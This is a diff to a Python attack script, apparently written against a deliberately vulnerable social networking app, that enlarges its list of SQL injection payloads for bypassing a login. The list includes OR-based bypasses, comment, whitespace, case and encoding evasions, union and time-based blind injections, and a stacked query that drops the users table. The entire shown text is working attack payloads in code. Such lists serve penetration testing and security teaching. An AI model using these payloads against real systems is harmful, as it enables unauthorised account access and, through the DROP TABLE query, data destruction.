@@ -239,17 +239,125 @@ class VulnerableSNSAttacker:
         print("[*] Testing SQL Injection payloads first...")
 
         payloads = [
+            # Classic SQLi payloads
             ("admin", "' or '1'='1' --", 'Single quote OR bypass with comment'),
             ("admin", "' or '1'='1", 'Single quote OR bypass without comment'),
             ("admin", '" or "1"="1" --', 'Double quote OR bypass'),
             ("admin", '" or 1=1 --', 'Double quote numeric OR'),
+
+            # Username field injection
             ('admin" or "a"="a" --', 'anything', 'Username field injection'),
             ('admin" --', 'anything', 'Comment out password'),
             ("admin' --", 'anything', 'Single quote comment out password'),
+            ("admin' OR '1'='1' --", 'password', 'Username field single quote injection'),
+            ("admin'or'1'='1'--", 'password', 'Username field no space injection'),
+
+            # Comment variations
             ("admin", "' OR 1=1--", 'Single quote no space comment'),
             ("admin", "' OR '1'='1' #", 'Single quote with hash comment'),
             ("admin", "' OR 1=1#", 'Single quote numeric with hash'),
-            ("admin' OR '1'='1' --", 'password', 'Username field single quote injection'),
+            ("admin", "' OR 1=1/*", 'SQL comment with /*'),
+            ("admin", "' OR '1'='1'/*", 'Single quote with /* comment'),
+            ("admin", "' OR 1=1;--", 'Semicolon with comment'),
+
+            # Space bypass techniques
+            ("admin", "'or'1'='1'--", 'No spaces single quote'),
+            ("admin", "'/**/or/**/1=1--", 'Comment-based space bypass'),
+            ("admin", "'\tor\t1=1--", 'Tab-based space bypass'),
+            ("admin", "'\nor\n1=1--", 'Newline-based space bypass'),
+            ("admin", "'+or+'1'='1'--", 'Plus sign space bypass'),
+            ("admin", "'%09or%091=1--", 'URL encoded tab bypass'),
+            ("admin", "'%0aor%0a1=1--", 'URL encoded newline bypass'),
+
+            # Case variation bypass
+            ("admin", "' Or '1'='1' --", 'Mixed case Or'),
+            ("admin", "' oR 1=1 --", 'Mixed case oR'),
+            ("admin", "' OR 1=1 --", 'Uppercase OR'),
+            ("admin", "' Or 1=1--", 'Mixed case no space'),
+
+            # Logical operator variations
+            ("admin", "' || '1'='1' --", 'Double pipe OR'),
+            ("admin", "' && 1=1 --", 'Double ampersand AND'),
+            ("admin", "' | 1 --", 'Single pipe'),
+            ("admin", "' & 1 --", 'Single ampersand'),
+
+            # Comparison operator variations
+            ("admin", "' or 1=1 limit 1--", 'Limit 1 bypass'),
+            ("admin", "' or 'a'='a' --", 'String comparison bypass'),
+            ("admin", "' or ''=' --", 'Empty string comparison'),
+            ("admin", "' or 1 --", 'Simple 1 bypass'),
+            ("admin", "' or true --", 'Boolean true bypass'),
+
+            # Union-based attempts
+            ("admin", "' UNION SELECT 1,1,1--", 'Union select 3 columns'),
+            ("admin", "' UNION SELECT NULL,NULL,NULL--", 'Union select NULL'),
+            ("admin", "' UNION ALL SELECT 1,1,1--", 'Union ALL select'),
+
+            # Time-based blind SQLi
+            ("admin", "' or sleep(5)--", 'Sleep-based blind SQLi'),
+            ("admin", "' or benchmark(10000000,md5('a'))--", 'Benchmark blind SQLi'),
+
+            # Stacked queries
+            ("admin", "'; DROP TABLE users--", 'Stacked query attempt'),
+            ("admin", "'; SELECT 1--", 'Stacked SELECT query'),
+
+            # Encoding bypass
+            ("admin", "%27%20or%20%271%27%3d%271%27--", 'URL encoded payload'),
+            ("admin", "&#39; or &#39;1&#39;=&#39;1&#39;--", 'HTML entity encoded'),
+
+            # Special character bypass
+            ("admin", "' or 1=1%00", 'Null byte bypass'),
+            ("admin", "' or 1=1\x00", 'Hex null byte'),
+            ("admin", "' or 1=1\n--", 'Literal newline'),
+
+            # Parenthesis bypass
+            ("admin", "') or ('1'='1' --", 'Parenthesis closure'),
+            ("admin", "')) or (('1'='1' --", 'Double parenthesis closure'),
+            ("admin", "') or '1'='1'--", 'Single closing paren'),
+
+            # Alternative syntax
+            ("admin", "admin' or 1=1#", 'Hash comment MySQL'),
+            ("admin", "admin' or 1=1/*", 'Block comment start'),
+            ("admin", "admin' or 1=1;%00", 'Semicolon null byte'),
+
+            # Concatenation bypass
+            ("admin", "' or CONCAT('a','a')='aa'--", 'CONCAT function'),
+            ("admin", "' or ASCII('a')=97--", 'ASCII function'),
+            ("admin", "' or CHAR(97)='a'--", 'CHAR function'),
+
+            # Hex encoding
+            ("admin", "0x61646d696e' or 1=1--", 'Hex encoded admin'),
+            ("admin", "' or 0x31=0x31--", 'Hex comparison'),
+
+            # Multiple conditions
+            ("admin", "' or 1=1 and '1'='1'--", 'OR and AND combination'),
+            ("admin", "' or (1=1 and 2=2)--", 'Grouped conditions'),
+
+            # PostgreSQL specific
+            ("admin", "' or 1=1--", 'PostgreSQL comment'),
+            ("admin", "' or 'x'='x' --", 'PostgreSQL string compare'),
+
+            # MySQL specific
+            ("admin", "' or 1=1#", 'MySQL hash comment'),
+            ("admin", "' /*!50000or*/ 1=1--", 'MySQL conditional comment'),
+
+            # MSSQL specific
+            ("admin", "' or 1=1;--", 'MSSQL semicolon'),
+            ("admin", "' or 1=1/**/--", 'MSSQL comment spacing'),
+
+            # Advanced evasion
+            ("admin", "'||'1'='1'--", 'Concatenation OR'),
+            ("admin", "' or '1'LIKE'1'--", 'LIKE operator'),
+            ("admin", "' or '1' IN ('1')--", 'IN operator'),
+            ("admin", "' or '1' BETWEEN '0' AND '2'--", 'BETWEEN operator'),
+
+            # Backtick variations
+            ("admin", "` or `1`=`1`--", 'Backtick usage'),
+
+            # More aggressive payloads
+            ("admin", "admin'--", 'Simple comment out'),
+            ("admin", "admin'#", 'Hash comment out'),
+            ("admin", "admin'/*", 'Block comment out'),
         ]
         
         for username, password, desc in payloads:
